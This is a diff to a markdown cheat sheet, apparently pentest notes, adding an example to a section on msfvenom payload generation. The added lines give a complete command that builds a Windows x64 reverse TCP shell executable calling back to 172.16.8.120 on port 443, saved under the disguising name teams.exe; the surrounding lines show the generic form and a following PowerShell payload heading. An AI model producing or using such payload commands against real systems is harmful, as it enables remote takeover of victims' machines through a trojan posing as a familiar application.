@@ -58,6 +58,12 @@ msfvenom -l payloads
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<mylocalhostip> LPORT=<myserverport> -f exe -o <name_of_the_exe>
 ```
 
+Example:
+
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.8.120 LPORT=443 -f exe -o teams.exe
+```
+
 ### Getting a powershell .exe payload
 
 ```shell
